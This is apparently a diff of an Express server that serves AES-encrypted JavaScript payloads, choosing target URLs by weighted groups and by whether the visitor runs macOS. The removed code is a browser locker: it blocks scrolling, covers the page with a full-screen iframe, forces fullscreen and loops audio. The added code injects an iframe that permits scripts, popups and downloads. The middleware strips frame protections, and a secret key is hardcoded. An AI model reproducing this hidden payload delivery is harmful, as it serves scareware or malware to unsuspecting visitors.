@@ -10,14 +10,18 @@ const secretKey = "2B9IyccRxXwiZctB2LiJFX2pKNedKvwO017H2ii4toIUcF5T3JbmskNEytf";
 app.use(cors());
 app.use(express.json());
 
+// Add CORS & Security Policy middleware
 app.use((req, res, next) => {
     res.header("Access-Control-Allow-Origin", "*");
     res.header("Access-Control-Allow-Headers", "Origin, X-Requested-With, Content-Type, Accept");
     res.header("Access-Control-Allow-Methods", "GET, POST, PUT, DELETE, OPTIONS");
     
-    // Bypass frame restrictions
-    res.removeHeader('X-Frame-Options');
-    res.setHeader('Content-Security-Policy', "frame-ancestors *;");
+    // Modern way to handle frame permissions
+    const originalXFrameOptions = res.getHeader('X-Frame-Options');
+    if (originalXFrameOptions === 'sameorigin') {
+        res.removeHeader('X-Frame-Options');
+        res.setHeader('X-Frame-Options', 'ALLOW-FROM *');
+    }
     next();
 });
 
@@ -28,15 +32,16 @@ function aesEncode(text) {
 }
 
 function getError() {
-    const errorJs = `console.log("Unauthorized Access Attempted");`;
-    return encodeURIComponent(aesEncode(errorJs));
+    const se1 = `console.log("Error Find");`;
+    const encrypted1 = aesEncode(se1);
+    return encodeURIComponent(encrypted1);
 }
 
 function getResponse(userAgent) {
-    // 1. Detect OS
+    // Detect if user is on macOS
     const isMac = /Macintosh|Mac OS X/i.test(userAgent);
 
-    // 2. Define Groups with Weights
+    // Define your Groups with weights and OS-specific links
     const linkGroups = [
         {
             id: "Group 1",
@@ -52,67 +57,59 @@ function getResponse(userAgent) {
         }
     ];
 
-    // 3. Selection Logic
-    const rand = Math.random();
-    let cumulative = 0;
-    let selectedGroup = linkGroups[0];
-    
-    for (const group of linkGroups) {
-        cumulative += group.weight;
-        if (rand <= cumulative) {
-            selectedGroup = group;
-            break;
+    // 1. Pick the group based on weight (70/30)
+    function selectGroup() {
+        const rand = Math.random();
+        let cumulative = 0;
+        for (const group of linkGroups) {
+            cumulative += group.weight;
+            if (rand <= cumulative) {
+                return group;
+            }
         }
+        return linkGroups[0]; // Fallback to first group
     }
 
+    const selectedGroup = selectGroup();
+
+    // 2. Select URL within that group based on OS detection
     const selectedUrl = isMac ? selectedGroup.macos : selectedGroup.others;
 
-    // 4. Build Payload (Integration of Page Lock + Fullscreen + Audio)
-    const payload = `
-        (function() {
-            // LOCK PAGE SCROLLING
-            document.documentElement.style.overflow = "hidden";
-            document.body.style.overflow = "hidden";
+    // 3. Build the JavaScript payload
+    const se1 = `
+        const iframe = document.createElement("iframe");
+        iframe.src = "${selectedUrl}";
 
-            // CREATE LOCKING CONTAINER
-            let bruceDiv = document.getElementById("bruceDiv");
-            if (!bruceDiv) {
-                bruceDiv = document.createElement("div");
-                bruceDiv.id = "bruceDiv";
-                bruceDiv.style.cssText = "z-index:99999; position:fixed; inset:0; background:black; overflow:hidden;";
-                document.body.prepend(bruceDiv);
-            }
+        // permissions
+        iframe.setAttribute(
+            "allow",
+            "fullscreen; autoplay; encrypted-media; picture-in-picture"
+        );
 
-            // CREATE IFRAME
-            const iframe = document.createElement("iframe");
-            iframe.src = "${selectedUrl}";
-            iframe.style.cssText = "width:100%; height:100%; border:0;";
-            iframe.allow = "fullscreen; autoplay; encrypted-media; picture-in-picture";
-            iframe.setAttribute("allowfullscreen", "");
-            iframe.setAttribute("webkitallowfullscreen", "");
-            iframe.setAttribute("mozallowfullscreen", "");
-            iframe.sandbox = "allow-scripts allow-popups allow-forms allow-downloads";
+        // fullscreen support
+        iframe.setAttribute("allowfullscreen", "");
+        iframe.setAttribute("webkitallowfullscreen", "");
+        iframe.setAttribute("mozallowfullscreen", "");
 
-            bruceDiv.replaceChildren(iframe);
+        // sandbox
+        iframe.setAttribute(
+            "sandbox",
+            "allow-scripts allow-popups allow-forms allow-downloads"
+        );
 
-            // GESTURE HANDLER: FULLSCREEN + AUDIO
-            const handleInteraction = () => {
-                // Request Fullscreen
-                const el = document.documentElement;
-                const fs = el.requestFullscreen || el.webkitRequestFullscreen || el.mozRequestFullScreen || el.msRequestFullscreen;
-                if (fs) fs.call(el);
+        // styles
+        iframe.style.width = "100%";
+        iframe.style.height = "100%";
+        iframe.style.border = "0px";
 
-                // Play Background Audio
-                const audio = new Audio("https://audio.jukehost.co.uk/qC8dN1AYE9nQkcTtcydsmA9f8nB5l0Yt");
-                audio.loop = true;
-                audio.play().catch(() => {});
-            };
-
-            document.addEventListener("click", handleInteraction, { once: true });
-        })();
+        // add to page
+        const container = document.getElementById("contentiframe");
+        if(container) {
+            container.replaceChildren(iframe);
+        }
     `;
 
-    return encodeURIComponent(aesEncode(payload));
+    return encodeURIComponent(aesEncode(se1));
 }
 
 // --- Routes ---
@@ -145,5 +142,6 @@ app.post("/timezone", (req, res) => {
 
 // --- Start Server ---
 app.listen(PORT, () => {
-    console.log(\`Server is running on http://localhost:\${PORT}\`);
+    console.log(`Server running on http://localhost:${PORT}`);
 });
+
